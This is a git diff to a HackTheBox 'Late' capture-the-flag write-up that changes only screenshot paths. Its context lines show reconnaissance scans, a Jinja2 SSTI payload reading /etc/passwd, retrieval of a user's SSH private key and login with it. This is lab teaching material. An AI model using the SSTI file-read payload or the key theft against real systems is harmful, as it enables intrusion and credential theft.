@@ -47,7 +47,7 @@ To verify if the host is reachable, we send a single ICMP packet:
 ping -c 1 10.10.11.156
 ```
 
-![ping](cases/HackTheBox/Machines/EASY/Late/screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The host responds, confirming it is alive.
 
@@ -70,7 +70,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.156 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![allports](cases/HackTheBox/Machines/EASY/Late/screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract the open ports:
 
@@ -78,7 +78,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](cases/HackTheBox/Machines/EASY/Late/screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -97,7 +97,7 @@ nmap -p22,80 -sC -sV 10.10.11.156 -oN targeted
 - `-oN`: Output in human-readable format  
 
 
-![targeted](cases/HackTheBox/Machines/EASY/Late/screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**
 
@@ -120,7 +120,7 @@ Continue the attack chain with the next commands:
 whatweb http://10.10.11.156
 ```
 
-![whatweb](cases/HackTheBox/Machines/EASY/Late/screenshots/whatweb.png)
+![whatweb](screenshots/whatweb.png)
 
 The scan indicates a **Flask/Jinja2 stack**.
 
@@ -134,7 +134,7 @@ After adding it to `/etc/hosts`, we can access the application:
 curl -i http://image.late.htb/
 ```
 
-![web](cases/HackTheBox/Machines/EASY/Late/screenshots/web.png)
+![web](screenshots/web.png)
 
 The vhost provides **OCR functionality** (uploading an image generates a `results.txt` file).
 
@@ -171,7 +171,7 @@ We exploit SSTI to read system files:
 {{get_flashed_message.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
 
-![etc_passwd](cases/HackTheBox/Machines/EASY/Late/screenshots/etc_passwd.png)
+![etc_passwd](screenshots/etc_passwd.png)
 
 Filter valid shells:
 
@@ -198,7 +198,7 @@ We attempt to read the userâ€™s private key:
 
 Result file:
 
-![id_rsa](cases/HackTheBox/Machines/EASY/Late/screenshots/id_rsa.png)
+![id_rsa](screenshots/id_rsa.png)
 
 We clean the key to ensure a valid PEM format:
 
@@ -212,7 +212,7 @@ Using the extracted key, we log in via SSH:
 ssh -i id_rsa svc_acc@10.10.11.156
 ```
 
-![user_flag](cases/HackTheBox/Machines/EASY/Late/screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 âœ… **User flag obtained**
 
